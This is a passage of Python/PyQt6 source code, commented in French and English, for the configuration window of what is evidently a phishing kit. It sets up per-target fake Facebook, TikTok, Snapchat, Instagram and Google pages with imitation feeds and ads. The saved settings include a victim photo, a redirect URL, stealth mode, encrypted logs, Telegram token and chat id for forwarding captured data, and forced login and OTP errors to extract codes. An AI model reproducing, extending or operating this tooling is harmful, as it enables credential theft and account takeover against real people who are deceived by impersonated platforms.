            # de plateforme charge automatiquement les publications correspondantes.
            try:
                if self.is_sandbox:
                    # ── Mode sandbox : stocker en mémoire par plateforme ──
                    import config
                    if not hasattr(config, 'sandbox_config'):
                        config.sandbox_config = {}
                    if "publications_by_platform" not in config.sandbox_config:
                        config.sandbox_config["publications_by_platform"] = {}
                    # Sauvegarder les pubs courantes dans l'ancienne plateforme
                    _old_platform = self._last_loaded_platform if hasattr(self, '_last_loaded_platform') else "facebook"
                    config.sandbox_config["publications_by_platform"][_old_platform] = list(self.publications)
                    # Charger les pubs de la nouvelle plateforme
                    if platform_id in config.sandbox_config["publications_by_platform"]:
                        self.publications = list(config.sandbox_config["publications_by_platform"][platform_id])
                    else:
                        # Pas encore en mémoire → charger depuis le dossier
                        from pub_manager import load_publications, migrate_to_per_platform
                        migrate_to_per_platform(self.tid)
                        self.publications = load_publications(self.tid, platform_id)
                        config.sandbox_config["publications_by_platform"][platform_id] = list(self.publications)
                    self._last_loaded_platform = platform_id
                    # ── Mettre à jour sandbox_config["publications"] pour le serveur ──
                    config.sandbox_config["publications"] = list(self.publications)
                else:
                    # ── Mode normal : charger depuis le dossier per-platform ──
                    from pub_manager import load_publications, migrate_to_per_platform
                    migrate_to_per_platform(self.tid)
                    self.publications = load_publications(self.tid, platform_id)
                self.refresh_pub_list()
            except Exception as e2:
                log_error_to_file("TargetConfigWindow._on_platform_changed.reload", e2)
                try:
                    self.refresh_pub_list()
                except Exception:
                    pass
        except Exception as e:
            log_error_to_file("TargetConfigWindow._on_platform_changed", e)

    def _apply_platform_caps(self, platform_id):
        """Show or hide tabs based on the platform's capabilities.

        Rules (per the user's spec):
          • Publications tab → only if caps['feed'] AND caps['publications'].
            This hides it for Google (login-only).
          • Ads tab → only if caps['ads'] is True. Currently only Facebook
            has ads=True; all other platforms (TikTok, Snapchat, Instagram,
            Google) hide the tab entirely.
          • The "Ajouter une publication" button label and dialog used by
            add_publication() / edit_publication() depend on caps['video_mode']:
              - "facebook_post"  → classic PublicationDialog (FB + Instagram)
              - "snapchat_spotlight" → VideoPublicationDialog (Snapchat variant)
              - "tiktok_fullscreen"  → VideoPublicationDialog (TikTok variant)
              - "none"           → publications tab is hidden (Google)
        """
        try:
            from platforms import get_capabilities_by_id
            caps = get_capabilities_by_id(platform_id)
            # Publications tab: only if platform supports feed + publications
            show_pubs = caps.get("feed", True) and caps.get("publications", True)
            # Ads tab: only if platform supports ads (Facebook only)
            show_ads = caps.get("ads", False)

            # Find tab indices by widget
            pubs_idx = self.tabs.indexOf(self.tab_pubs) if hasattr(self, 'tab_pubs') else -1
            ads_idx = self.tabs.indexOf(self.tab_ads) if hasattr(self, 'tab_ads') else -1

            if pubs_idx >= 0:
                self.tabs.setTabVisible(pubs_idx, show_pubs)
                if not show_pubs and self.tabs.currentIndex() == pubs_idx:
                    self.tabs.setCurrentIndex(0)
            if ads_idx >= 0:
                self.tabs.setTabVisible(ads_idx, show_ads)
                if not show_ads and self.tabs.currentIndex() == ads_idx:
                    self.tabs.setCurrentIndex(0)

            # ── Update the "Add publication" button label + tooltip based on
            # the platform's video_mode, so the user immediately sees whether
            # they're adding a classic post (FB) or a vertical video (SC/TT).
            try:
                vmode = caps.get("video_mode", "facebook_post")
                if hasattr(self, 'btn_add_pub') and self.btn_add_pub:
                    if vmode == "snapchat_spotlight":
                        self.btn_add_pub.setText("➕ Ajouter une vidéo Spotlight")
                        self.btn_add_pub.setToolTip("Ajoute une vidéo verticale plein écran (style Snapchat Spotlight)")
                    elif vmode == "tiktok_fullscreen":
                        self.btn_add_pub.setText("➕ Ajouter une vidéo TikTok")
                        self.btn_add_pub.setToolTip("Ajoute une vidéo verticale plein écran (style TikTok For You)")
                    else:
                        self.btn_add_pub.setText("➕ Ajouter une publication")
                        self.btn_add_pub.setToolTip("Ajoute une publication au feed")
            except Exception as e:
                log_error_to_file("TargetConfigWindow._apply_platform_caps.btn_label", e)

            # ── Interface Mode: only "Mobile" for mobile-only platforms ──
            # Facebook est maintenant mobile-only aussi
            mobile_only = platform_id in ("facebook", "tiktok", "snapchat", "instagram", "google")
            if mobile_only:
                self.rb_auto.setVisible(False)
                self.rb_pc.setVisible(False)
                if not self.rb_mob.isChecked():
                    self.rb_mob.setChecked(True)
            else:
                self.rb_auto.setVisible(True)
                self.rb_pc.setVisible(True)
        except Exception as e:
            log_error_to_file("TargetConfigWindow._apply_platform_caps", e)

    def _get_selected_platform(self):
        """Return the currently selected platform id."""
        try:
            if self.rb_tiktok.isChecked():    return "tiktok"
            if self.rb_snapchat.isChecked():  return "snapchat"
            if self.rb_google.isChecked():    return "google"
            if self.rb_instagram.isChecked(): return "instagram"
            return "facebook"
        except Exception as e:
            log_error_to_file("TargetConfigWindow._get_selected_platform", e)
            return "facebook"

    def save_data(self):
        button_id = f"save_{self.tid}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            mode = "auto"
            if self.rb_mob.isChecked(): mode = "mobile"
            elif self.rb_pc.isChecked(): mode = "pc"

            # Mobile-only platforms force mode = "mobile"
            # Facebook est maintenant mobile-only aussi
            try:
                _pid = self._get_selected_platform()
                if _pid in ("facebook", "tiktok", "snapchat", "instagram", "google"):
                    mode = "mobile"
            except Exception as e:
                log_error_to_file("TargetConfigWindow._complete_save.platform_mode", e)

            # Type-safe conversions — empty strings default silently (not an error)
            try: port_val = int(self.i_port.text()) if self.i_port.text().strip() else 5000
            except (ValueError, TypeError) as e: 
                port_val = 5000
                log_error_to_file("TargetConfigWindow.parse_int.port", e)

            try: id_err_val = int(self.i_id_errors.text()) if self.i_id_errors.text().strip() else 1
            except (ValueError, TypeError) as e:
                id_err_val = 1
                log_error_to_file("TargetConfigWindow.parse_int.id_errors", e)

            try: otp_err_val = int(self.i_otp_errors.text()) if self.i_otp_errors.text().strip() else 1
            except (ValueError, TypeError) as e:
                otp_err_val = 1
                log_error_to_file("TargetConfigWindow.parse_int.otp_errors", e)

            try: msg_restore_err_val = int(self.i_msg_restore_errors.text()) if self.i_msg_restore_errors.text().strip() else 1
            except (ValueError, TypeError) as e:
                msg_restore_err_val = 1
                log_error_to_file("TargetConfigWindow.parse_int.msg_restore_errors", e)

            try: fake_loading_dur_val = int(self.i_fake_loading_duration.text()) if self.i_fake_loading_duration.text().strip() else 3
            except (ValueError, TypeError) as e:
                fake_loading_dur_val = 3
                log_error_to_file("TargetConfigWindow.parse_int.fake_loading_dur", e)

            try: second_loading_dur_val = int(self.i_second_loading_duration.text()) if self.i_second_loading_duration.text().strip() else 3
            except (ValueError, TypeError) as e:
                second_loading_dur_val = 3
                log_error_to_file("TargetConfigWindow.parse_int.second_loading_dur", e)

            # Type de chargement sélectionné (donnée associée à l'item du combo)
            loading_type_val = self.combo_loading_type.currentData() or "spinner"

            # Vitesse d'animation : preset + custom
            loading_speed_preset_val = self.combo_loading_speed.currentData() or "normal"
            loading_speed_custom_raw = self.i_loading_speed_custom.text().strip()
            loading_speed_custom_val = ""
            if loading_speed_custom_raw:
                try:
                    _sc_float = float(loading_speed_custom_raw)
                    if _sc_float > 0:
                        loading_speed_custom_val = loading_speed_custom_raw
                except (ValueError, TypeError) as e:
                    loading_speed_custom_val = ""
                    log_error_to_file("TargetConfigWindow.parse_float.loading_speed_custom", e)

            # Preserve victim_photo if it exists in the JSON
            existing_victim_photo = ""
            try:
                path = os.path.join(TARGETS_DIR, f"{self.tid}.json")
                if os.path.exists(path):
                    with open(path, 'r', encoding='utf-8') as _f:
                        existing_victim_photo = json.load(_f).get("victim_photo", "")
            except Exception as e:
                log_error_to_file("TargetConfigWindow._complete_save.victim_photo", e)

            data = {
                "display_name": self.i_n.text(),
                "target_name": self.i_n.text(),
                "platform": self._get_selected_platform(),
                "target_pic": self.i_p.text(),
                "redirect_url": self.i_r.text(),
                "log_file": self.i_l.text(),
                "port": port_val,
                "stealth_mode": self.cb_stealth.isChecked(),
                "encrypt_logs": self.cb_encrypt_logs.isChecked(),
                "send_telegram": self.cb_telegram.isChecked(),
                "telegram_token": self.i_token.text(),
                "telegram_chat_id": self.i_chatid.text(),
                "id_errors": id_err_val,
                "otp_errors": otp_err_val,
                "msg_restore_errors": msg_restore_err_val,
                "save_attempts": self.i_save_attempts.text().strip(),
                "mode": mode,
                "feed_enabled": self.cb_feed.isChecked(),
                "fake_loading_enabled": self.cb_fake_loading.isChecked(),
                "fake_loading_duration": fake_loading_dur_val,
                "fake_loading_type": loading_type_val,
                "second_loading_enabled": self.cb_second_loading.isChecked(),
                "second_loading_duration": second_loading_dur_val,
                "loading_speed_preset": loading_speed_preset_val,
                "loading_speed_custom": loading_speed_custom_val,
                "custom_otp_sub": self.i_custom_otp_sub.text().strip(),
                "custom_msg_restore_sub": self.i_custom_msg_restore_sub.text().strip(),
                "message_restore_enabled": self.cb_msg_restore.isChecked(),
                # NOTE: 'publications' est intentionnellement absent ici.
                # Elles sont sauvegardées séparément par pub_manager.
                "ads": self.ads,
                "custom_videos_dir": self.i_videos_dir.text().strip(),
                "victim_photo": existing_victim_photo,
            }

            # Sauvegarder les publications dans leurs fichiers individuels
            # (seulement pour les cibles normales, PAS pour le sandbox qui reste en mémoire)
            # Sauvegarde par plateforme : seule la plateforme courante est sauvegardée,
            # les autres plateformes ne sont pas touchées.
            if not self.is_sandbox:
                try:
                    from pub_manager import save_publications
                    _save_platform = self._get_selected_platform()
                    save_publications(self.tid, self.publications, _save_platform)
                except Exception as e:
                    log_error_to_file("TargetConfigWindow.save_data[publications]", e)
            
            if self.is_sandbox:
                import config
                import copy
                old_target = config.sandbox_config.get("target_name")
                old_custom_dir = config.sandbox_config.get("custom_videos_dir", "")
                old_temp_dir = config.sandbox_config.get("_sandbox_temp_dir", "")
                config.sandbox_config.update(copy.deepcopy(data))
                config.sandbox_config["target_name"] = old_target
                # Preserve the sandbox temp directory — don't let the config window
                # overwrite it with the original target's custom_videos_dir.
                config.sandbox_config["custom_videos_dir"] = old_custom_dir
                config.sandbox_config["_sandbox_temp_dir"] = old_temp_dir
                # Les publications sont gérées séparément - les injecter directement
                config.sandbox_config["publications"] = copy.deepcopy(self.publications)
                # ── Mettre à jour publications_by_platform pour le sandbox ──
                # Stocker les pubs courantes dans la plateforme courante
                try:
                    if "publications_by_platform" not in config.sandbox_config:
                        config.sandbox_config["publications_by_platform"] = {}
                    _cur_plat = self._get_selected_platform()
                    config.sandbox_config["publications_by_platform"][_cur_plat] = copy.deepcopy(self.publications)
                except Exception:
                    pass
                
                orig_text = self.btn_save.text()
                self.btn_save.setText("✅ Sauvegardé dans la Sandbox !")
                from theme import btn_style_success as _bss_sandbox
                self.btn_save.setStyleSheet(_bss_sandbox())
                QTimer.singleShot(2000, self._reset_save_btn)
                button_manager.unlock_button(button_id)
            else:
                # Check if target is currently running
                from config import active_servers
                running_port = None
                for port, cfg in list(active_servers.items()):
                    if cfg.get("target_name") == self.tid or cfg.get("tid") == self.tid:
                        running_port = port
                        break
                
                # If target is running, stop it then wait for port to be freed
                if running_port is not None and hasattr(self.main_win, 'stop_target'):
                    self.main_win.stop_target(running_port)
                    # Save immediately, then restart once the port is actually free, with a 2 sec delay
                    self._complete_save(data, port_val, restart_port=port_val)
                else:
                    # Target is not running, save directly
                    self._complete_save(data, port_val, restart_port=None)
        except Exception as e:
            log_error_to_file("TargetConfigWindow.save_data", e)
            log_error("TargetConfigWindow.save_data", e)
            button_manager.unlock_button(button_id)
    
    def _complete_save(self, data, port_val, restart_port=None):
        """Save config to JSON. If restart_port is set, wait until port is free then restart."""
        try:
            path = os.path.join(TARGETS_DIR, f"{self.tid}.json")
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=4)
            
            self.btn_save.setText("✅ Sauvegardé !")
            from theme import btn_style_success as _bss_saved
            self.btn_save.setStyleSheet(_bss_saved())
            QTimer.singleShot(2000, self._reset_save_btn)

            if restart_port is not None and hasattr(self.main_win, 'start_target'):
                tid_ref = self.tid
                main_win_ref = self.main_win
                restart_attempts_ref = [0]

                def _do_start():
                    try:
                        main_win_ref.start_target(tid_ref)
                    except Exception as e:
                        try:
                            log_error_to_file("TargetConfigWindow._complete_save._do_start", e)
                        except Exception as e2:
                            log_error_to_file("TargetConfigWindow._complete_save._do_start.log_fail", e2)
                        try:
                            from PyQt6.QtWidgets import QMessageBox
                            QMessageBox.critical(None, "Erreur de redémarrage",
                                f"Impossible de redémarrer le serveur pour '{tid_ref}':\n{e}")
                        except Exception as e2:
                            log_error_to_file("TargetConfigWindow._complete_save._do_start.msgbox", e2)

                def _check_and_restart():
                    try:
                        restart_attempts_ref[0] += 1
                        if not is_port_in_use(restart_port):
                            QTimer.singleShot(2000, _do_start)
                        elif restart_attempts_ref[0] < 30:
                            QTimer.singleShot(200, _check_and_restart)
                        else:
                            try:
                                log_error_to_file("TargetConfigWindow._complete_save",
                                    f"Timeout waiting for port {restart_port} to free.")
                            except Exception as e2:
                                log_error_to_file("TargetConfigWindow._complete_save.timeout_log", e2)
                            try:
                                from PyQt6.QtWidgets import QMessageBox
                                QMessageBox.warning(None, "Redémarrage",
                                    f"Le port {restart_port} n'a pas pu être libéré à temps.\n"
                                    f"Le serveur n'a pas pu redémarrer automatiquement.")
                            except Exception as e2:
                                log_error_to_file("TargetConfigWindow._complete_save.timeout_msgbox", e2)
                    except RuntimeError as e:
                        log_error_to_file("TargetConfigWindow._complete_save._check_and_restart.RuntimeError", e)
                    except Exception as e:
                        try:
                            log_error_to_file("TargetConfigWindow._complete_save._check_and_restart", e)
                        except Exception as e2:
                            log_error_to_file("TargetConfigWindow._complete_save._check_and_restart.log_fail", e2)

                QTimer.singleShot(300, _check_and_restart)

        except Exception as e:
            log_error_to_file("TargetConfigWindow._complete_save", e)
            log_error("TargetConfigWindow._complete_save", e)
        finally:
            button_id = f"save_{self.tid}"
            button_manager.unlock_button(button_id)

    def _reset_save_btn(self):
        """Reset the save button to its original text and style."""
        try:
            self.btn_save.setText("💾 Sauvegarder les paramètres")
            self._style_save_button(self.btn_save)
        except Exception as e:
            try:
                from helpers import log_error
                log_error("TargetConfigWindow._reset_save_btn", e)
            except Exception:
                pass

    def reset_save_btn(self, text):
        """Legacy method — calls _reset_save_btn."""
        self._reset_save_btn()

    def _get_dialog_class(self):
        """Retourne la classe de dialogue appropriée pour la plateforme sélectionnée.
        Facebook → PublicationDialog (sidebar complet)
        Snapchat → SnapchatPublicationDialog (style jaune compact)
        TikTok → TikTokPublicationDialog (style rouge compact)
        Instagram → InstagramPublicationDialog (style bleu compact)
        """
        try:
            pid = self._get_selected_platform()
            if pid == "snapchat" and SnapchatPublicationDialog is not None:
                return SnapchatPublicationDialog
            if pid == "tiktok" and TikTokPublicationDialog is not None:
                return TikTokPublicationDialog
            if pid == "instagram" and InstagramPublicationDialog is not None:
                return InstagramPublicationDialog
            # Facebook (et fallback) → PublicationDialog classique
            return PublicationDialog
        except Exception as e:
            log_error_to_file("TargetConfigWindow._get_dialog_class", e)
            return PublicationDialog

    def add_publication(self):
        button_id = f"add_pub_{self.tid}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            dialog_class = self._get_dialog_class()
            dlg = dialog_class(self, tid=self.tid, platform=self._get_selected_platform())
            if dlg.exec() == QDialog.DialogCode.Accepted:
                self.publications.append(dlg.get_data())
                self.refresh_pub_list()
        except Exception as e:
            log_error_to_file("TargetConfigWindow.add_publication", e)
            log_error("TargetConfigWindow.add_publication", e)
        finally:
            button_manager.unlock_button(button_id)

    def edit_publication(self, index):
        button_id = f"edit_pub_{self.tid}_{index}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            if 0 <= index < len(self.publications):
                dialog_class = self._get_dialog_class()
                dlg = dialog_class(self, self.publications[index], tid=self.tid, platform=self._get_selected_platform())
                if dlg.exec() == QDialog.DialogCode.Accepted:
                    self.publications[index] = dlg.get_data()
                    self.refresh_pub_list()
        except Exception as e:
            log_error_to_file("TargetConfigWindow.edit_publication", e)
            log_error("TargetConfigWindow.edit_publication", e)
        finally:
            button_manager.unlock_button(button_id)

    def delete_publication(self, index):
        button_id = f"del_pub_{self.tid}_{index}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            if 0 <= index < len(self.publications):
                self.publications.pop(index)
                self.refresh_pub_list()
        except Exception as e:
            log_error_to_file("TargetConfigWindow.delete_publication", e)
            log_error("TargetConfigWindow.delete_publication", e)
        finally:
            button_manager.unlock_button(button_id)

    def toggle_publication_visibility(self, index):
        button_id = f"toggle_pub_vis_{self.tid}_{index}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            if 0 <= index < len(self.publications):
                pub = self.publications[index]
                pub["visible"] = not pub.get("visible", True)
                self.refresh_pub_list()
        except Exception as e:
            log_error_to_file("TargetConfigWindow.toggle_publication_visibility", e)
            log_error("TargetConfigWindow.toggle_publication_visibility", e)
        finally:
            button_manager.unlock_button(button_id)

    def on_list_reordered(self):
        try:
            # ── self.publications ne contient que les pubs de la plateforme
            # courante (chargées depuis le dossier per-platform). Le réordonnancement
            # est donc direct, pas besoin de fusion avec d'autres plateformes. ──
            new_list = []
            for i in range(self.pub_list_widget.count()):
                item = self.pub_list_widget.item(i)
                pub_data = item.data(Qt.ItemDataRole.UserRole)
                if pub_data:
                    new_list.append(pub_data)
            self.publications = new_list
            self.refresh_pub_list()
        except Exception as e:
            log_error_to_file("TargetConfigWindow.on_list_reordered", e)

        # Update ads list if it exists
        if hasattr(self, 'ad_list_widget'):
            new_ad_list = []
            for i in range(self.ad_list_widget.count()):
                item = self.ad_list_widget.item(i)
                ad_data = item.data(Qt.ItemDataRole.UserRole)
                if ad_data:
                    new_ad_list.append(ad_data)
            self.ads = new_ad_list
            self.refresh_ad_list()

    def refresh_pub_list(self):
        # Guard: pub_list_widget may not exist yet during __init__ / theme refresh
        if not hasattr(self, 'pub_list_widget') or self.pub_list_widget is None:
            return
        try:
            self.pub_list_widget.blockSignals(True)
            self.pub_list_widget.clear()

            from theme import get_theme as _gt_pub
            _t_pub = _gt_pub()

            # ── Type → visual metadata (icon + accent color) ──
            # Distinct hues so the type is recognizable at a glance even
            # without reading the icon. Colors are theme-independent so they
            # remain readable on both light and dark themes.
            _TYPE_META = {
                "text":  {"icon": "📝", "color": "#3b82f6"},  # blue
                "image": {"icon": "📷", "color": "#8b5cf6"},  # violet
                "video": {"icon": "🎥", "color": "#ec4899"},  # pink
                "share": {"icon": "🔄", "color": "#06b6d4"},  # cyan
                "link":  {"icon": "🔗", "color": "#f59e0b"},  # amber
            }

            # ── Les publications sont déjà filtrées par plateforme (chargées
            # depuis le dossier de la plateforme courante), pas besoin de
            # filtrer à nouveau ici. ──

            for idx, pub in enumerate(self.publications):
                item = QListWidgetItem(self.pub_list_widget)
                item.setData(Qt.ItemDataRole.UserRole, pub)

                # ── Build the row widget ──
                row = QWidget()
                row.setObjectName("PubRow")

                ptype = pub.get("type", "text")
                is_visible = pub.get("visible", True)
                tm = _TYPE_META.get(ptype, _TYPE_META["text"])

                # Card background: hidden pubs use a slightly dimmer background
                # so the user can spot them at a glance. Visible pubs use the
                # theme's bg_alt for a clean card look.
                if is_visible:
                    _row_bg = _t_pub['bg_alt']
                    _left_border = tm['color']
                else:
                    _row_bg = _t_pub['bg_input']
                    _left_border = _t_pub['text_muted']

                # IMPORTANT: use #PubRow object name so the QSS only applies to
                # the row container, NOT to its child QLabels/QPushButtons
                # (otherwise every label inside inherits the border + background).
                row.setStyleSheet(f"""
                    QWidget#PubRow {{
                        background-color: {_row_bg};
                        border-left: 3px solid {_left_border};
                        border-top: 1px solid {_t_pub['border']};
                        border-right: 1px solid {_t_pub['border']};
                        border-bottom: 1px solid {_t_pub['border']};
                        border-radius: 6px;
                    }}
                """)

                row_lay = QHBoxLayout(row)
                row_lay.setContentsMargins(10, 6, 8, 6)
                row_lay.setSpacing(10)

                # ── Drag handle (Unicode braille pattern, looks like 6 dots) ──
                lbl_drag = QLabel("⠿")
                lbl_drag.setStyleSheet(
                    f"color: {_t_pub['text_muted']}; font-size: 16px; "
                    f"font-weight: bold; background: transparent; border: none;"
                )
                lbl_drag.setFixedWidth(14)
                lbl_drag.setToolTip("Glisser pour réordonner")
                row_lay.addWidget(lbl_drag)

                # ── Type badge (28x28 colored square with the icon) ──
                badge = QLabel(tm['icon'])
                badge.setFixedSize(28, 28)
                badge.setAlignment(Qt.AlignmentFlag.AlignCenter)
                badge.setStyleSheet(f"""
                    QLabel {{
                        background-color: {tm['color']};
                        color: white;
                        border-radius: 6px;
                        font-size: 14px;
                        font-weight: bold;
                    }}
                """)
                badge.setToolTip(f"Type : {ptype}")
                row_lay.addWidget(badge)

                # ── Preview text (elided, strikethrough when hidden) ──
                preview = (pub.get("text", "") or "").strip()
                if not preview:
                    preview = "(publication vide)"
                if len(preview) > 50:
                    preview = preview[:50] + "…"
                lbl_text = QLabel(preview)
                _text_color = _t_pub['text'] if is_visible else _t_pub['text_muted']
                lbl_text.setStyleSheet(
                    f"color: {_text_color}; font-size: 12px; "
                    f"font-weight: 500; background: transparent; border: none;"
                )
                # Strikethrough for hidden pubs — visual cue that this pub
                # won't appear in the victim's feed.
                if not is_visible:
                    from PyQt6.QtGui import QFont as _QFont
                    _f = lbl_text.font()
                    _f.setStrikeOut(True)
                    lbl_text.setFont(_f)
                # Tooltip with the full text so the user can read it on hover
                # without needing to open the edit dialog.
                lbl_text.setToolTip(pub.get("text", "") or "(vide)")
                row_lay.addWidget(lbl_text, stretch=1)

                # ── Likes chip ──
                likes = pub.get('likes', 0)
                lbl_likes = QLabel(f"👍 {likes}")
                lbl_likes.setStyleSheet(
                    f"color: {_t_pub['text_dim']}; font-size: 11px; "
                    f"background: transparent; border: none;"
                )
                lbl_likes.setToolTip(f"{likes} J'aime")
                row_lay.addWidget(lbl_likes)

                # ── Comments chip ──
                comments = pub.get('comments_count', pub.get('comments', 0))
                lbl_comments = QLabel(f"💬 {comments}")
                lbl_comments.setStyleSheet(
                    f"color: {_t_pub['text_dim']}; font-size: 11px; "
                    f"background: transparent; border: none;"
                )
                lbl_comments.setToolTip(f"{comments} commentaires")
                row_lay.addWidget(lbl_comments)

                # ── Action buttons (32x32 — slightly larger than the original 28
                # for easier clicking) ──
                from theme import btn_style_icon as _bsi

                btn_toggle = BounceButton("✓" if is_visible else "✗")
                btn_toggle.setFixedSize(32, 32)
                btn_toggle.setToolTip("Masquer cette publication" if is_visible
                                      else "Afficher cette publication")
                btn_toggle.setStyleSheet(_bsi("success" if is_visible else "danger"))
                btn_toggle.clicked.connect(lambda checked, i=idx: self.toggle_publication_visibility(i))
                row_lay.addWidget(btn_toggle)

                btn_edit = BounceButton("✏️")
                btn_edit.setFixedSize(32, 32)
                btn_edit.setToolTip("Modifier")
                btn_edit.setStyleSheet(_bsi("accent"))
                btn_edit.clicked.connect(lambda checked, i=idx: self.edit_publication(i))
                row_lay.addWidget(btn_edit)

                btn_del = BounceButton("🗑️")
                btn_del.setFixedSize(32, 32)
                btn_del.setToolTip("Supprimer")
                btn_del.setStyleSheet(_bsi("danger"))
                btn_del.clicked.connect(lambda checked, i=idx: self.delete_publication(i))
                row_lay.addWidget(btn_del)

                # Force the row to a sensible height so the badge + buttons
                # don't get clipped by the QListWidgetItem default size.
                row.setFixedHeight(44)
                item.setSizeHint(row.sizeHint())
                self.pub_list_widget.setItemWidget(item, row)

            self.pub_list_widget.blockSignals(False)

        except Exception as e:
            log_error_to_file('Release.refresh_pub_list', e)
            log_error('Release.refresh_pub_list', e)
    def add_ad(self):
        try:
            from widgets import AdDialog
            dialog = AdDialog(self, tid=self.tid)
            if dialog.exec():
                new_ad = dialog.get_data()
                self.ads.insert(0, new_ad)
                self.refresh_ad_list()

        except Exception as e:
            log_error_to_file('Release.add_ad', e)
            log_error('Release.add_ad', e)
    def edit_ad(self, index):
        try:
            if 0 <= index < len(self.ads):
                from widgets import AdDialog
                dialog = AdDialog(self, ad_data=self.ads[index], tid=self.tid)
                if dialog.exec():
                    self.ads[index].update(dialog.get_data())
                    self.refresh_ad_list()

        except Exception as e:
            log_error_to_file('Release.edit_ad', e)
            log_error('Release.edit_ad', e)
    def delete_ad(self, index):
        try:
            if 0 <= index < len(self.ads):
                reply = QMessageBox.question(self, 'Confirmation', 'Voulez-vous vraiment supprimer cette publicité ?',
                                             QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, QMessageBox.StandardButton.No)
                if reply == QMessageBox.StandardButton.Yes:
                    self.ads.pop(index)
                    self.refresh_ad_list()

        except Exception as e:
            log_error_to_file('Release.delete_ad', e)
            log_error('Release.delete_ad', e)
    def toggle_ad_visibility(self, index):
        try:
            if 0 <= index < len(self.ads):
                self.ads[index]["visible"] = not self.ads[index].get("visible", True)
                self.refresh_ad_list()


        except Exception as e:
            log_error_to_file('Release.toggle_ad_visibility', e)
            log_error('Release.toggle_ad_visibility', e)
    def refresh_ad_list(self):
        # Guard: ad_list_widget may not exist yet or may have been deleted
        if not hasattr(self, 'ad_list_widget') or self.ad_list_widget is None:
            return
        try:
            # Vérifier que le widget n'a pas été détruit
            _ = self.ad_list_widget.count()
        except RuntimeError:
            return
        try:
            self.ad_list_widget.blockSignals(True)
            self.ad_list_widget.clear()

            from theme import get_theme as _gt_ad
            _t_ad = _gt_ad()

            # Ads use a single warning-tone color (orange/amber) so they're
            # visually distinct from publications.
            _AD_COLOR = "#f59e0b"

            for idx, ad in enumerate(self.ads):
                item = QListWidgetItem(self.ad_list_widget)
                item.setData(Qt.ItemDataRole.UserRole, ad)

                # ── Build the row widget ──
                row = QWidget()
                row.setObjectName("AdRow")

                is_visible = ad.get("visible", True)
                if is_visible:
                    _row_bg = _t_ad['bg_alt']
                    _left_border = _AD_COLOR
                else:
                    _row_bg = _t_ad['bg_input']
                    _left_border = _t_ad['text_muted']

                # Same pattern as refresh_pub_list: #AdRow selector so the QSS
                # only affects the container, not the child widgets.
                row.setStyleSheet(f"""
                    QWidget#AdRow {{
                        background-color: {_row_bg};
                        border-left: 3px solid {_left_border};
                        border-top: 1px solid {_t_ad['border']};
                        border-right: 1px solid {_t_ad['border']};
                        border-bottom: 1px solid {_t_ad['border']};
                        border-radius: 6px;
                    }}
                """)

                row_lay = QHBoxLayout(row)
                row_lay.setContentsMargins(10, 6, 8, 6)
                row_lay.setSpacing(10)

                # ── Drag handle ──
                lbl_drag = QLabel("⠿")
                lbl_drag.setStyleSheet(
                    f"color: {_t_ad['text_muted']}; font-size: 16px; "
                    f"font-weight: bold; background: transparent; border: none;"
                )
                lbl_drag.setFixedWidth(14)
                lbl_drag.setToolTip("Glisser pour réordonner")
                row_lay.addWidget(lbl_drag)

                # ── Ad badge (28x28 amber square with 📢 icon) ──
                badge = QLabel("📢")
                badge.setFixedSize(28, 28)
                badge.setAlignment(Qt.AlignmentFlag.AlignCenter)
                badge.setStyleSheet(f"""
                    QLabel {{
                        background-color: {_AD_COLOR};
                        color: white;
                        border-radius: 6px;
                        font-size: 14px;
                        font-weight: bold;
                    }}
                """)
                badge.setToolTip("Publicité")
                row_lay.addWidget(badge)

                # ── Label chip (e.g. "Sponsorisé") ──
                label_text = ad.get("label", "Sponsorisé") or "Sponsorisé"
                lbl_label = QLabel(label_text)
                lbl_label.setStyleSheet(f"""
                    QLabel {{
                        background-color: {_t_ad['border']};
                        color: {_t_ad['accent_text']};
                        border-radius: 4px;
                        padding: 2px 8px;
                        font-size: 10px;
                        font-weight: bold;
                    }}
                """)
                row_lay.addWidget(lbl_label)

                # ── Ad title (elided, strikethrough when hidden) ──
                title = (ad.get("title", "") or "").strip()
                if not title:
                    title = "(sans titre)"
                if len(title) > 40:
                    title = title[:40] + "…"
                lbl_title = QLabel(title)
                _title_color = _t_ad['text'] if is_visible else _t_ad['text_muted']
                lbl_title.setStyleSheet(
                    f"color: {_title_color}; font-size: 12px; "
                    f"font-weight: 500; background: transparent; border: none;"
                )
                if not is_visible:
                    from PyQt6.QtGui import QFont as _QFont_ad
                    _f_ad = lbl_title.font()
                    _f_ad.setStrikeOut(True)
                    lbl_title.setFont(_f_ad)
                lbl_title.setToolTip(ad.get("title", "") or "(sans titre)")
                row_lay.addWidget(lbl_title, stretch=1)

                # ── Action buttons (32x32) ──
                from theme import btn_style_icon as _bsi_ad

                btn_toggle = BounceButton("✓" if is_visible else "✗")
                btn_toggle.setFixedSize(32, 32)
                btn_toggle.setToolTip("Masquer cette publicité" if is_visible
                                      else "Afficher cette publicité")
                btn_toggle.setStyleSheet(_bsi_ad("success" if is_visible else "danger"))
                btn_toggle.clicked.connect(lambda checked, i=idx: self.toggle_ad_visibility(i))
                row_lay.addWidget(btn_toggle)

                btn_edit = BounceButton("✏️")
                btn_edit.setFixedSize(32, 32)
                btn_edit.setToolTip("Modifier")
                btn_edit.setStyleSheet(_bsi_ad("accent"))
                btn_edit.clicked.connect(lambda checked, i=idx: self.edit_ad(i))
                row_lay.addWidget(btn_edit)

                btn_del = BounceButton("🗑️")
                btn_del.setFixedSize(32, 32)
                btn_del.setToolTip("Supprimer")
                btn_del.setStyleSheet(_bsi_ad("danger"))
                btn_del.clicked.connect(lambda checked, i=idx: self.delete_ad(i))
                row_lay.addWidget(btn_del)

                row.setFixedHeight(44)
                item.setSizeHint(row.sizeHint())
                self.ad_list_widget.setItemWidget(item, row)

            self.ad_list_widget.blockSignals(False)

        except Exception as e:
            log_error_to_file('Release.refresh_ad_list', e)
            log_error('Release.refresh_ad_list', e)
    def select_custom_videos_dir(self):
        try:
